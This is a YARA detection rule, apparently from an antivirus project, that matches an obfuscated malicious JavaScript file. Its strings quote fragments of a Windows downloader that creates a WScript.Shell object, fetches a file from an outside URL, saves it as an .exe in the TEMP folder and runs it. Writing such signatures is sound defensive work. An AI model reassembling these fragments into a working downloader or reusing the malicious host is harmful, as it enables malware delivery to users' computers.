rule sig_20160330_12f66d36f8e328e09fb6c6c090dfdb35 {
  meta:
    description = "datamaliciousorder - file 20160330_12f66d36f8e328e09fb6c6c090dfdb35.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7fc4e4840ec7e28166ce9b5f68e57eeac7a9d006f283959ee44fabb0032c6f44"

  strings:
    $s1  = "var _XF = function _NS() {return WScript[_LJ](\"WScript\"+\".Shell\");}(), _NU = 11;" fullword ascii
    $s2  = "function _FY(_P, _K0){_GT = _GT * 1; return _P - _K0;};" fullword ascii
    $s3  = "_KF0[_WU](\"GET\", \"http://ihlasauracleanmax.co/j3dlad\", false);" fullword ascii
    $s4  = "if (_KF0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _E() {return _XF[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"X1fhDCFNdjs8Y.ex\" + \"e\";};" fullword ascii
    $s6  = "function _DX(){return _U + \"\";};" fullword ascii
    $s7  = "function _X() {return ((_HB == true) && (_HB == _AM)) ? 1 : _GT;};" fullword ascii
    $s8  = "function _Y(_FC){_XF[\"Run\"](_FC, _GT, _GT);};" fullword ascii
    $s9  = " while (_M){" fullword ascii
    $s10 = "function _Z()" fullword ascii
    $s11 = "return _FY(_DF, _DZ);" fullword ascii
    $s12 = "function _K(_BQ) {var _FX = (1, 2, 3, 4, 5, _BQ); return _FX;};" fullword ascii
    $s13 = "function _NB(){return _LJ;};" fullword ascii
    $s14 = "function _ES(){return 22;};" fullword ascii
    $s15 = "var _TX = new this[\"Date\"]();" fullword ascii
    $s16 = "var _KF = false;" fullword ascii
    $s17 = "var _HB = false;" fullword ascii
    $s18 = "_AM = true; " fullword ascii
    $s19 = "_HB = true; " fullword ascii
    $s20 = "var _AM = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}